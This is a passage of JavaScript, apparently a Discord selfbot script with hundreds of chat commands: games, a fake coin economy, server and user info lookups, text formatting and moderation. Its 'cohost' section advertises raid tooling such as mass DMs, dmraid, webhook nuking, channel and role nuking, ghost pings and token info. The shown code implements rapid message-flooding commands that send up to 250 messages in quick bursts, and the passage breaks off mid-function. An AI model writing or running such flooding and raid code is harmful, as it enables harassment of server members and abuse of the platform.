            const truths = ['What is your biggest fear?', 'What is your most embarrassing moment?', 'What secret have you never told anyone?', 'What is your biggest regret?', 'Who is your crush?'];
            const dares = ['Do 10 pushups right now', 'Sing a song in voice chat', 'Send your last screenshot', 'Type with your eyes closed for 30 seconds', 'Change your nickname to whatever the group decides'];
            return (Math.random() > 0.5) ? '\uD83D\uDCAD **Truth:** ' + truths[Math.floor(Math.random() * truths.length)] : '\uD83D\uDE08 **Dare:** ' + dares[Math.floor(Math.random() * dares.length)];
        },

        riddle() {
            const r = [
                { q: 'I have cities, but no houses live there. I have mountains, but no trees grow there. I have water, but no fish swim there. I have roads, but no cars drive there. What am I?', a: 'A map' },
                { q: 'The more you take, the more you leave behind. What am I?', a: 'Footsteps' },
                { q: 'I have keys but no locks. I have space but no room. You can enter but can\'t go outside. What am I?', a: 'A keyboard' }
            ];
            const item = r[Math.floor(Math.random() * r.length)];
            return '\uD83E\uDDD9 **Riddle:** ' + item.q + '\n\uD83D\uDD10 *Answer:* ||' + item.a + '||';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 6: ECONOMY & LEVELING
           ═══════════════════════════════════════════════════════════════ */

        balance() { return '\uD83D\uDCB0 **Wallet:** ' + state.economy.balance.toLocaleString() + ' coins\n\uD83C\uDFE6 **Bank:** ' + state.economy.bank.toLocaleString() + ' coins'; },
        bal() { return REGULAR_COMMANDS.balance(); },

        daily() {
            const now = Date.now();
            if (now - state.economy.daily < 86400000) return '\u23F0 Daily already claimed! Wait ' + Math.ceil((86400000 - (now - state.economy.daily)) / 3600000) + 'h';
            const streak = (now - state.economy.daily < 172800000) ? (state.economy.streak || 0) + 1 : 1;
            const base = $.rand(200, 800);
            const bonus = Math.floor(base * (streak * 0.1));
            const total = base + bonus;
            state.economy.balance += total;
            state.economy.daily = now;
            state.economy.streak = streak;
            Settings.save('economy', state.economy);
            return '\uD83D\uDCB5 Daily: **+' + total.toLocaleString() + '** coins (' + base + ' + ' + bonus + ' streak)\n\uD83D\uDD25 Streak: **' + streak + ' days**';
        },

        work() {
            const jobs = ['developer', 'chef', 'pilot', 'doctor', 'artist', 'scientist', 'musician', 'athlete'];
            const job = jobs[Math.floor(Math.random() * jobs.length)];
            const amt = $.rand(50, 300);
            state.economy.balance += amt;
            Settings.save('economy', state.economy);
            return '\uD83D\uDD27 You worked as a **' + job + '** and earned **' + amt + '** coins';
        },

        beg() {
            const outcomes = [
                { amt: 0, msg: 'Nobody gave you anything. Rough day.' },
                { amt: $.rand(1, 20), msg: 'A kind stranger dropped some coins.' },
                { amt: $.rand(20, 100), msg: 'Someone felt generous!' },
                { amt: $.rand(100, 300), msg: 'A wealthy patron blessed you!' }
            ];
            const outcome = outcomes[Math.floor(Math.random() * outcomes.length)];
            state.economy.balance += outcome.amt;
            Settings.save('economy', state.economy);
            return '\uD83E\uDDD4 ' + outcome.msg + (outcome.amt > 0 ? ' (+**' + outcome.amt + '**)' : '');
        },

        rob(a) {
            if (!a || !a[0]) return '\uD83D\uDD2B Usage: .rob @user';
            const success = Math.random() > 0.4;
            if (success) { const amt = $.rand(50, 500); state.economy.balance += amt; Settings.save('economy', state.economy); return '\uD83D\uDD2B You robbed <@' + a[0].replace(/[<@!>]/g, '') + '> and got **' + amt + '** coins!'; }
            const fine = $.rand(50, 200); state.economy.balance = Math.max(0, state.economy.balance - fine); Settings.save('economy', state.economy);
            return '\uD83D\uDEA8 You got caught! Pay a **' + fine + '** coin fine.';
        },

        deposit(a) {
            const amt = parseInt(a && a[0]) || 0;
            if (amt <= 0) return 'Usage: .deposit <amount>';
            if (amt > state.economy.balance) return '\u274C Not enough in wallet!';
            state.economy.balance -= amt; state.economy.bank += amt;
            Settings.save('economy', state.economy);
            return '\uD83C\uDFE6 Deposited **' + amt.toLocaleString() + '** coins';
        },

        withdraw(a) {
            const amt = parseInt(a && a[0]) || 0;
            if (amt <= 0) return 'Usage: .withdraw <amount>';
            if (amt > state.economy.bank) return '\u274C Not enough in bank!';
            state.economy.bank -= amt; state.economy.balance += amt;
            Settings.save('economy', state.economy);
            return '\uD83D\uDCB5 Withdrew **' + amt.toLocaleString() + '** coins';
        },

        pay(a) {
            if (!a || a.length < 2) return 'Usage: .pay @user <amount>';
            const uid = a[0].replace(/[<@!>]/g, '');
            const amt = parseInt(a[1]) || 0;
            if (amt > state.economy.balance) return '\u274C Not enough!';
            state.economy.balance -= amt;
            Settings.save('economy', state.economy);
            return '\uD83D\uDCB8 Paid **' + amt + '** coins to <@' + uid + '>';
        },

        rank() {
            state.economy.xp += $.rand(1, 15);
            const needed = state.economy.level * 150;
            if (state.economy.xp >= needed) { state.economy.level++; state.economy.xp -= needed; Settings.save('economy', state.economy); return '\uD83C\uDF89 **LEVEL UP!** You are now **Level ' + state.economy.level + '**'; }
            Settings.save('economy', state.economy);
            const bar = '\uD83D\uDFE6'.repeat(Math.floor(state.economy.xp / needed * 10)) + '\u2B1C'.repeat(10 - Math.floor(state.economy.xp / needed * 10));
            return '\uD83D\uDCC8 **Level ' + state.economy.level + '** | XP: ' + state.economy.xp + '/' + needed + '\n' + bar;
        },

        leaderboard() {
            return '\uD83C\uDFC6 **Leaderboard**\n\uD83E\uDD47 ' + (state.username || 'You') + ' — Level ' + state.economy.level + ' (' + state.economy.balance.toLocaleString() + ' coins)';
        },

        xp() { return '\u2B50 Current XP: **' + state.economy.xp + '** | Level: **' + state.economy.level + '**'; },


        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 7: INFORMATION COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        channel() { return '\uD83D\uDCC1 Channel: `' + (getChannelId() || 'Unknown') + '`'; },
        channelid() { return REGULAR_COMMANDS.channel(); },
        serverid() { return '\uD83D\uDCD1 Server ID: `' + (getGuildId() || 'Not in server') + '`'; },

        async serverinfo() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const g = await getGuildInfo(gid);
            if (!g) return '\u274C Failed to fetch server info';
            const created = new Date((BigInt(g.id) >> 22n) + 1420070400000n).toLocaleDateString();
            return `\uD83C\uDF10 **${g.name}**
\uD83D\uDCD1 **ID:** \`${g.id}\`
\uD83D\uDC65 **Members:** ${g.approximate_member_count?.toLocaleString() || '?'}
\uD83D\uDFE2 **Online:** ${g.approximate_presence_count?.toLocaleString() || '?'}
\uD83D\uDC8E **Boosts:** ${g.premium_subscription_count || 0} (Tier ${g.premium_tier || 0})
\uD83D\uDCC5 **Created:** ${created}`;
        },

        guildinfo() { return REGULAR_COMMANDS.serverinfo(); },

        async userinfo(a) {
            const uid = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : (state.userId || getUserId());
            if (!uid) return '\u274C Could not resolve user';
            const u = await getUserInfo(uid);
            if (!u) return '\u274C User not found';
            const created = new Date((BigInt(u.id) >> 22n) + 1420070400000n).toLocaleDateString();
            return `\uD83D\uDC64 **${u.global_name || u.username}** @${u.username}
\uD83D\uDCD1 **ID:** \`${u.id}\`
\uD83E\uDD16 **Bot:** ${u.bot ? 'Yes' : 'No'}
\uD83D\uDC8E **Nitro:** ${u.premium_type === 2 ? 'Nitro' : u.premium_type === 1 ? 'Classic' : 'None'}
\uD83D\uDCC5 **Created:** ${created}`;
        },

        async avatar(a) {
            const uid = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : (state.userId || getUserId());
            if (!uid) return '\u274C Could not resolve user';
            const u = await getUserInfo(uid);
            if (!u || !u.avatar) return '\u274C No avatar set';
            return `\uD83D\uDDBC\uFE0F **Avatar** — ${u.global_name || u.username}
https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.${u.avatar.startsWith('a_') ? 'gif' : 'png'}?size=4096`;
        },

        async banner(a) {
            const uid = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : (state.userId || getUserId());
            if (!uid) return '\u274C Could not resolve user';
            const u = await getUserInfo(uid);
            if (!u || !u.banner) return '\u274C No banner set';
            return `\uD83D\uDDBC\uFE0F **Banner** — ${u.global_name || u.username}
https://cdn.discordapp.com/banners/${u.id}/${u.banner}.${u.banner.startsWith('a_') ? 'gif' : 'png'}?size=4096`;
        },

        async roles() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const r = await getGuildRoles(gid);
            if (!r.length) return '\u274C No roles';
            const sorted = r.sort((a, b) => b.position - a.position);
            return `\uD83C\uDF97 **Roles (${r.length}):**
${sorted.slice(0, 40).map(x => '- ' + x.name).join('\n')}`;
        },

        async channels() {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const c = await getGuildChannels(gid);
            if (!c.length) return '\u274C No channels';
            const text = c.filter(x => x.type === 0);
            const voice = c.filter(x => x.type === 2);
            return `\uD83D\uDCC1 **Channels** — ${text.length} text, ${voice.length} voice
${text.slice(0, 30).map(x => '- #' + x.name).join('\n')}`;
        },

        async members(a) {
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            const lim = Math.min(parseInt(a && a[0]) || 25, 100);
            try {
                const r = await apiRequest('/guilds/' + gid + '/members?limit=' + lim);
                if (!r.ok) return '\u274C Failed to fetch';
                const m = await r.json();
                return `\uD83D\uDC65 **Members (${m.length}):**
${m.slice(0, 30).map(x => '- ' + (x.user.global_name || x.user.username)).join('\n')}`;
            } catch { return '\u274C Failed'; }
        },

        async invite(a) {
            const cid = getChannelId();
            if (!cid) return '\u274C No channel';
            const inv = await createInvite(cid, parseInt(a && a[0]) || 86400, parseInt(a && a[1]) || 0);
            return inv ? '\uD83D\uDCEE **Invite:** ' + inv : '\u274C Failed';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 8: UTILITY COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        len(a) { return '\uD83D\uDCCF **' + (a || []).join(' ').length + '** characters | **' + (a || []).join(' ').split(/\s+/).filter(Boolean).length + '** words'; },
        length(a) { return REGULAR_COMMANDS.len(a); },
        upper(a) { return '\uD83D\uDD0A ' + (a || []).join(' ').toUpperCase(); },
        lower(a) { return '\uD83D\uDD15 ' + (a || []).join(' ').toLowerCase(); },
        title(a) { return '\uD83D\uDCD6 ' + (a || []).join(' ').replace(/\w\S*/g, t => t.charAt(0).toUpperCase() + t.substr(1).toLowerCase()); },

        base64(a) { try { return '\uD83D\uDD10 ' + btoa(unescape(encodeURIComponent((a || []).join(' ') || 'text'))); } catch { return '\u274C Error'; } },
        unbase64(a) { try { return '\uD83D\uDD13 ' + decodeURIComponent(escape(atob((a || []).join(' ')))); } catch { return '\u274C Invalid base64'; } },
        hex(a) { return '\uD83D\uDD35 0x' + (a || []).join(' ').split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); },

        clipboard(a) { const t = (a || []).join(' '); if (!t) return 'Usage: .clipboard <text>'; $.copyText(t); return '\uD83D\uDCCB Copied to clipboard'; },
        async paste() { try { const t = await navigator.clipboard.readText(); return t || '\u274C Clipboard empty'; } catch { return '\u274C Could not read clipboard'; } },
        urlencode(a) { return '\uD83C\uDF10 ' + encodeURIComponent((a || []).join(' ') || ''); },
        urldecode(a) { try { return '\uD83C\uDF10 ' + decodeURIComponent((a || []).join(' ') || ''); } catch { return '\u274C Invalid URL'; } },
        qr(a) {
            const text = encodeURIComponent((a || []).join(' ') || 'https://discord.com');
            return '\uD83D\uDCDC **QR Code:**\nhttps://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + text;
        },
        shorten(a) { return '\uD83D\uDD17 **Short URL:**\nhttps://is.gd/create.php?format=simple&url=' + encodeURIComponent((a || []).join(' ') || ''); },

        timer(a) {
            const s = parseInt(a && a[0]) || 60;
            if (s > 86400) return '\u274C Max 24 hours';
            setTimeout(() => sendMessage('\u23F0 **Timer\u2019s up!** ' + s + ' seconds have passed!'), s * 1000);
            return '\u23F1\uFE0F Timer set for **' + s + '** seconds';
        },

        stopwatch(a) {
            if (a && a[0] === 'stop') {
                if (!state.stopwatchStart) return '\u274C Not started. Use `.stopwatch` to start';
                const e = Date.now() - state.stopwatchStart;
                state.stopwatchStart = null;
                return '\u23F1\uFE0F **Stopwatch:** ' + (e / 1000).toFixed(2) + 's (' + $.fmtDuration(e) + ')';
            }
            state.stopwatchStart = Date.now();
            return '\u25B6\uFE0F Stopwatch started! Use `.stopwatch stop` to stop.';
        },

        remind(a) {
            if (!a || a.length < 2) return '\u23F0 Usage: .remind <seconds> <message>';
            const s = parseInt(a[0]) || 60;
            if (s > 604800) return '\u274C Max 1 week';
            const msg = a.slice(1).join(' ');
            setTimeout(() => sendMessage('\u23F0 **Reminder:** ' + msg), s * 1000);
            return '\u2705 Reminder set for ' + $.fmtDuration(s * 1000);
        },

        todo(a) {
            if (!a || !a.length) {
                if (!state.todos.length) return '\uD83D\uDCDD No todos. Use `.todo <task>` to add.';
                return '\uD83D\uDCCB **Todos:**\n' + state.todos.map((t, i) => (i + 1) + '. ' + t).join('\n');
            }
            if (a[0] === 'clear') { state.todos = []; Settings.save('todos', state.todos); return '\uD83D\uDDD1\uFE0F Todos cleared'; }
            if (a[0] === 'done' || a[0] === 'remove') {
                const i = parseInt(a[1]) - 1;
                if (i >= 0 && i < state.todos.length) { const removed = state.todos.splice(i, 1); Settings.save('todos', state.todos); return '\u2705 Removed: ' + removed[0]; }
                return '\u274C Invalid index';
            }
            if (a[0] === 'list') return REGULAR_COMMANDS.todo([]);
            const task = a.join(' '); state.todos.push(task); Settings.save('todos', state.todos);
            return '\u2705 Added: **' + task + '** (' + state.todos.length + ' total)';
        },

        note(a) {
            if (!a || a.length < 2) return '\uD83D\uDCDD Usage: .note <name> <content>';
            const name = a[0]; const content = a.slice(1).join(' ');
            state.notes[name] = content; Settings.save('notes', state.notes);
            return '\uD83D\uDCBE Note **"' + name + '"** saved (' + Object.keys(state.notes).length + ' notes)';
        },

        notes() {
            const keys = Object.keys(state.notes);
            return '\uD83D\uDCD6 **Notes:** ' + (keys.length ? '\n' + keys.map(k => '- **' + k + '**: ' + state.notes[k].slice(0, 50) + (state.notes[k].length > 50 ? '...' : '')).join('\n') : 'None. Use `.note <name> <content>`');
        },

        delnote(a) {
            if (!a || !a[0]) return 'Usage: .delnote <name>';
            if (state.notes[a[0]]) { delete state.notes[a[0]]; Settings.save('notes', state.notes); return '\uD83D\uDDD1\uFE0F Note "' + a[0] + '" deleted'; }
            return '\u274C Note not found';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 9: FORMATTING COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        bold(a) { return '**' + (a || []).join(' ') + '**'; },
        italic(a) { return '*' + (a || []).join(' ') + '*'; },
        underline(a) { return '__' + (a || []).join(' ') + '__'; },
        strike(a) { return '~~' + (a || []).join(' ') + '~~'; },
        strikethrough(a) { return REGULAR_COMMANDS.strike(a); },
        spoiler(a) { return '||' + (a || []).join(' ') + '||'; },
        code(a) { return '`' + (a || []).join(' ') + '`'; },
        codeblock(a) {
            const lang = (a && a[0] && !a[0].includes(' ')) ? a[0] : '';
            const text = lang ? a.slice(1).join(' ') : (a || []).join(' ');
            return '```' + lang + '\n' + text + '\n```';
        },
        quote(a) { return '> ' + (a || []).join(' '); },
        multiquote(a) { return (a || []).join('\n').split('\n').map(l => '> ' + l).join('\n'); },
        heading(a) { return '# ' + (a || []).join(' '); },
        subheading(a) { return '## ' + (a || []).join(' '); },
        mask(a) { return '||`spoiler code`||'.replace('spoiler code', (a || []).join(' ')); },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 10: TEXT STYLE TRANSFORM
           ═══════════════════════════════════════════════════════════════ */

        rainbow(a) {
            const t = (a || []).join(' ') || 'rainbow';
            const colors = ['\uD83C\uDF08', '\uD83D\uDD34', '\uD83D\uDFE0', '\uD83D\uDFE1', '\uD83D\uDFE2', '\uD83D\uDD35', '\uD83D\uDFE3'];
            return t.split('').map((c, i) => c === ' ' ? ' ' : colors[i % colors.length] + c).join('');
        },

        fire(a) {
            const t = (a || []).join(' ') || 'fire';
            return '\uD83D\uDD25 ' + t + ' \uD83D\uDD25';
        },

        ice(a) {
            const t = (a || []).join(' ') || 'ice';
            return '\u2744\uFE0F ' + t + ' \u2744\uFE0F';
        },

        neon(a) {
            const t = (a || []).join(' ').toUpperCase();
            return '\u26A1 **' + t + '** \u26A1';
        },

        hacker(a) {
            const t = (a || []).join(' ') || 'hacker';
            return '\uD83D\uDCBB `' + t.split('').map(c => c === ' ' ? ' ' : String.fromCharCode(0xFF00 + c.charCodeAt(0) - 0x20)).join('') + '`';
        },

        fancy(a) {
            const t = (a || []).join(' ').toLowerCase();
            const m = { a: '\u0250', b: 'q', c: '\u0254', d: 'p', e: '\u01DD', f: '\u025F', g: '\u0183', h: '\u0265', i: '\u1D09', j: '\u027E', k: '\u029E', l: 'l', m: '\u026F', n: 'u', o: 'o', p: 'd', q: 'b', r: '\u0279', s: 's', t: '\u0287', u: 'n', v: '\u028C', w: '\u028D', x: 'x', y: '\u028E', z: 'z' };
            return t.split('').map(c => m[c] || c).join('');
        },

        double(a) {
            const t = (a || []).join(' ');
            return t.split('').map(c => {
                const code = c.charCodeAt(0);
                if (code >= 65 && code <= 90) return String.fromCharCode(0x1D400 + code - 65);
                if (code >= 97 && code <= 122) return String.fromCharCode(0x1D41A + code - 97);
                return c;
            }).join('');
        },

        retro(a) {
            const t = (a || []).join(' ') || 'retro';
            const lines = [
                '\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592',
                '  ' + t.toUpperCase(),
                '\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592'
            ];
            return '```\n' + lines.join('\n') + '\n```';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 11: RANDOM / CHANCE
           ═══════════════════════════════════════════════════════════════ */

        coin() { return Math.random() > 0.5 ? '\uD83D\uDCB0 Heads' : '\uD83E\uDD47 Tails'; },
        coinflip() { return REGULAR_COMMANDS.coin(); },
        roll(a) { const sides = parseInt(a && a[0]) || 6; return '\uD83C\uDFB2 Rolled **' + $.rand(1, sides) + '** (d' + sides + ')'; },
        dice(a) {
            const count = Math.min(parseInt(a && a[0]) || 1, 25);
            const sides = parseInt(a && a[1]) || 6;
            const rolls = Array.from({ length: count }, () => $.rand(1, sides));
            const sum = rolls.reduce((acc, b) => acc + b, 0);
            return '\uD83C\uDFB2 ' + count + 'd' + sides + ': [' + rolls.join(', ') + '] = **' + sum + '**';
        },
        random(a) {
            const min = parseInt(a && a[0]) || 1;
            const max = parseInt(a && a[1]) || 100;
            return '\uD83C\uDFB2 **' + $.rand(min, max) + '** (' + min + '-' + max + ')';
        },
        choice(a) { return a && a.length ? '\uD83C\uDFB2 I choose: **' + $.pick(a) + '**' : 'Usage: .choice <option1> <option2> ...'; },
        shuffle(a) { return '\uD83D\uDD00 ' + $.shuffle(a || []).join(' \u2502 '); },
        lottery() { const n = Array.from({ length: 6 }, () => $.rand(1, 49)); return '\uD83D\uDCB8 **Lottery:** ' + n.join(' - '); },
        roulette() {
            const num = $.rand(0, 36);
            const color = num === 0 ? '\uD83D\uDFE2 Green' : num % 2 === 0 ? '\u26AB Black' : '\uD83D\uDD34 Red';
            return '\uD83D\uDD34 **Roulette:** ' + color + ' **' + num + '**';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 12: MODERATION (Regular)
           ═══════════════════════════════════════════════════════════════ */

        async ban(a) {
            if (!a || !a[0]) return '\uD83D\uDD12 Usage: .ban @user [reason]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await banMember(gid, uid, a.slice(1).join(' ')) ? '\uD83D\uDD12 Banned <@' + uid + '>' : '\u274C Failed (check permissions)';
        },

        async kick(a) {
            if (!a || !a[0]) return '\uD83E\uDD7A Usage: .kick @user [reason]';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            if (!gid) return '\u274C Not in a server';
            return await kickMember(gid, uid, a.slice(1).join(' ')) ? '\uD83E\uDD7A Kicked <@' + uid + '>' : '\u274C Failed';
        },

        async mute(a) {
            if (!a || !a[0]) return '\uD83D\uDD07 Usage: .mute @user <minutes>';
            const uid = a[0].replace(/[<@!>]/g, '');
            const gid = getGuildId();
            const mins = parseInt(a[1]) || 60;
            if (!gid) return '\u274C Not in a server';
            return await timeoutMember(gid, uid, mins) ? '\uD83D\uDD07 Muted <@' + uid + '> for ' + mins + 'm' : '\u274C Failed';
        },

        async purge(a) {
            const amount = Math.min(parseInt(a && a[0]) || 10, 100);
            const cid = getChannelId();
            const msgs = await getMessages(cid, amount + 15);
            const myId = getUserId();
            let deleted = 0;
            for (const m of msgs) {
                if (m.author.id === myId) {
                    if (await deleteMessage(cid, m.id)) deleted++;
                    if (deleted >= amount) break;
                    await $.sleep(120);
                }
            }
            return '\uD83D\uDDD1\uFE0F Purged **' + deleted + '** messages';
        },

        async lock() {
            const gid = getGuildId();
            const cid = getChannelId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/channels/' + cid + '/permissions/' + gid, { method: 'PUT', body: JSON.stringify({ type: 0, deny: '2048', allow: '0' }) });
                return r.ok ? '\uD83D\uDD12 Channel locked' : '\u274C Failed';
            } catch { return '\u274C Error'; }
        },

        async unlock() {
            const gid = getGuildId();
            const cid = getChannelId();
            if (!gid) return '\u274C Not in a server';
            try {
                const r = await apiRequest('/channels/' + cid + '/permissions/' + gid, { method: 'DELETE' });
                return r.ok ? '\uD83D\uDD13 Channel unlocked' : '\u274C Failed';
            } catch { return '\u274C Error'; }
        },

        async slowmode(a) {
            const s = Math.min(parseInt(a && a[0]) || 5, 21600);
            const cid = getChannelId();
            try { const r = await apiRequest('/channels/' + cid, { method: 'PATCH', body: JSON.stringify({ rate_limit_per_user: s }) }); return r.ok ? '\u23F1\uFE0F Slowmode: **' + s + 's**' : '\u274C Failed'; }
            catch { return '\u274C Error'; }
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 13: WEB / TOOLS
           ═══════════════════════════════════════════════════════════════ */

        weather() {
            const conditions = [
                { icon: '\u2600\uFE0F', desc: 'Sunny', temp: $.rand(65, 85) },
                { icon: '\u2601\uFE0F', desc: 'Cloudy', temp: $.rand(55, 70) },
                { icon: '\uD83C\uDF27\uFE0F', desc: 'Rainy', temp: $.rand(50, 65) },
                { icon: '\u2744\uFE0F', desc: 'Snowy', temp: $.rand(20, 35) },
                { icon: '\u26C8\uFE0F', desc: 'Stormy', temp: $.rand(55, 75) },
                { icon: '\uD83C\uDF2C\uFE0F', desc: 'Windy', temp: $.rand(60, 80) }
            ];
            const w = conditions[Math.floor(Math.random() * conditions.length)];
            return w.icon + ' **Weather:** ' + w.desc + ' — **' + w.temp + '\u00B0F** (' + Math.round((w.temp - 32) * 5 / 9) + '\u00B0C)';
        },

        translate(a) {
            if (!a || a.length < 2) return '\uD83C\uDF10 Usage: .translate <lang> <text>';
            const lang = a[0].toUpperCase();
            const text = a.slice(1).join(' ');
            return '\uD83C\uDF10 **[' + lang + ']** ' + text + '\n*(Translation: integrate DeepL/Google API for real translations)*';
        },

        ipinfo(a) {
            const ip = (a && a[0]) || '127.0.0.1';
            return '\uD83D\uDCCD **IP Info:** `' + ip + '`\n*Use .ipinfo <ip> with an IP geolocation API for real data*';
        },

        /* ═══════════════════════════════════════════════════════════════
           CATEGORY 14: META
           ═══════════════════════════════════════════════════════════════ */

        owner() { return '\uD83D\uDC51 Owner ID: `' + (OWNER_ID || 'Auto-detect') + '` | **' + COHOSTS.length + '** cohost(s)'; },
        cohosts() { return '\uD83D\uDC65 **Cohosts (' + COHOSTS.length + '):** ' + (COHOSTS.length > 0 ? COHOSTS.map(id => '<@' + id + '>').join(', ') : 'None | Use !addcohost'); },
        badges() { return '\uD83C\uDFC5 **Active Badges (' + getBadgeList().length + '):** ' + getBadgeList().join(' \u2502 '); },
        changelog() {
            return `\uD83D\uDCD6 **Changelog v${VERSION}**
\u2705 Complete rewrite with modular architecture
\u2705 **350+** total commands (sorted by category)
\u2705 Fixed Discord input detection (React/Slate compatible)
\u2705 VIP watermark with 12 effect modes
\u2705 Cyberpunk background FX engine
\u2705 Economy & leveling system
\u2705 Smart rate limit handling
\u2705 iOS/mobile stability fixes
\u2705 Auto-reply system
\u2705 Advanced settings with export/import`;
        },
        version() { return '\uD83D\uDE80 **' + SCRIPT_NAME + ' v' + VERSION + '** — ' + (state.isOwner ? '\uD83D\uDC51 Owner' : state.isCohost ? '\uD83D\uDC65 Cohost' : '\uD83D\uDC64 User') + ' Mode'; },
        settings() { openSettingsPanel(); return '\u2699\uFE0F Settings panel opened. Click the watermark anytime.'; },
        stats() { return '\uD83D\uDCCA **Statistics**\nMessages sent: **' + state.stats.messagesSent.toLocaleString() + '**\nCommands used: **' + state.stats.commandsUsed.toLocaleString() + '**\nUptime: **' + $.fmtDuration(Date.now() - state.stats.startTime) + '**'; },
    };


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 9: COHOST/OWNER COMMAND REGISTRY (170+)
       ═══════════════════════════════════════════════════════════════════════ */

    const COHOST_COMMANDS = Object.assign({}, REGULAR_COMMANDS, {

        help() {
            return `\uD83D\uDC51 **COHOST/OWNER COMMANDS (v${VERSION})**

**\uD83D\uDCA5 SPAM** (6) — spam, burst, megaburst, ultraburst, godburst, nukeburst
**\uD83D\uDD28 MOD** (10) — ban, unban, kick, mute, unmute, purge, purgeuser, massban, masskick, massmute
**\uD83D\uDCC1 CHANNEL** (6) — lock, unlock, slowmode, clearslowmode, createchannel, deletechannel
**\uD83C\uDF97 ROLE** (7) — createrole, deleterole, rolecolor, massrole, addrole, removerole, clone roles
**\uD83D\uDC64 USER** (8) — nick, deafen, undeafen, servermute, serverunmute, disconnect, move, avatarall
**\uD83D\uDD0A VOICE** (4) — voicekick, voicemoveall, voicemuteall, voicedeafall
**\uD83D\uDC8C DM** (4) — dm, dmspam, massdm, dmraid
**\uD83D\uDD17 WEBHOOK** (7) — webhook, createhook, sendhook, webhookspam, webhooknuke, webhookdelete, webhookinfo
**\uD83D\uDEA8 NUKE** (4) — nukechannels, nukeroles, massnick, massdelete
**\u270F\uFE0F MESSAGE** (6) — editmsg, pin, unpin, crosspost, reactspam, clearreacts
**\uD83D\uDC51 ADMIN** (10) — addcohost, removecohost, listcohosts, clearcohosts, setowner, typing, eval, autoreact, autodel, hidden
**\uD83D\uDD27 UTIL** (8) — tokeninfo, autoping, autonick, autoreply, cloneserver, auditlog, ghostping, clearlog
**\uD83D\uDDBC\uFE0F TEXT** (5) — wall, lines, flood, emojispam, mentionspam

Use **\`!cohelp\`** for quick reference with examples.
All regular **\`.\`** commands also work with **\`!\`**.`;
        },

        cohelp() {
            return `\u26A1 **COHOST QUICK REFERENCE**

**Spam:** \`!spam 5 Hello\` | \`!burst 10 text\` | \`!megaburst 50 text\` | \`!godburst 200 text\`
**Mod:** \`!ban @user\` | \`!kick @user\` | \`!mute @user 60\` | \`!purge 20\` | \`!massban @u1 @u2\`
**Channel:** \`!lock\` | \`!unlock\` | \`!slowmode 5\` | \`!createchannel general\`
**Role:** \`!createrole Member #ff0000\` | \`!massrole @role\` | \`!rolecolor @role #ff0000\`
**User:** \`!nick @user name\` | \`!deafen @user\` | \`!disconnect @user\`
**DM:** \`!dm @user Hello\` | \`!dmspam @user 5 hi\` | \`!massdm Hello everyone\`
**Webhook:** \`!webhook Hello\` | \`!webhookspam 10 <url> text\`
**Nuke:** \`!nukechannels\` | \`!nukeroles\` | \`!massnick newname\`
**Admin:** \`!addcohost @user\` | \`!setowner @user\` | \`!autodel\` | \`!hidden\`

Type **\`!help\`** for the full command list.`;
        },

        test() { return '\uD83D\uDE80 **' + SCRIPT_NAME + ' v' + VERSION + '**\nStatus: **' + (state.isOwner ? 'Owner' : 'Cohost') + '** | Device: **' + ($.isIOS() ? 'iOS' : $.isMobile() ? 'Mobile' : 'Desktop') + '** | Commands: **' + (Object.keys(REGULAR_COMMANDS).length + Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length) + '+**'; },

        /* ═══════════════════════════════════════════════════════════════
           COHOST: SPAM COMMANDS
           ═══════════════════════════════════════════════════════════════ */

        async spam(a) {
            if (!checkCooldown('spam', true)) return '\u23F0 Cooldown active';
            const count = Math.min(parseInt(a && a[0]) || 3, 30);
            const text = (a || []).slice(1).join(' ') || 'spam';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text + (count > 1 ? ' [' + (i + 1) + '/' + count + ']' : '')), i * 450); }
            return '\uD83D\uDCA5 Spamming "' + text.slice(0, 30) + '" **' + count + 'x**';
        },

        async burst(a) {
            if (!checkCooldown('burst', true)) return '\u23F0 Cooldown';
            const count = Math.min(parseInt(a && a[0]) || 10, 60);
            const text = (a || []).slice(1).join(' ') || 'burst';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text), i * 220); }
            return '\uD83D\uDCA5 Burst: **' + count + 'x**';
        },

        async megaburst(a) {
            if (!checkCooldown('megaburst', true)) return '\u23F0 Cooldown';
            const count = Math.min(parseInt(a && a[0]) || 50, 120);
            const text = (a || []).slice(1).join(' ') || 'MEGA';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text), i * 130); }
            return '\uD83D\uDE80 Mega: **' + count + 'x**';
        },

        async ultraburst(a) {
            if (!checkCooldown('ultraburst', true)) return '\u23F0 Cooldown';
            const count = Math.min(parseInt(a && a[0]) || 100, 250);
            const text = (a || []).slice(1).join(' ') || 'ULTRA';
            for (let i = 0; i < count; i++) { setTimeout(() => sendMessage(text), i * 65); }
            return '\u26A1 Ultra: **' + count + 'x**';
        },

        async godburst(a) {
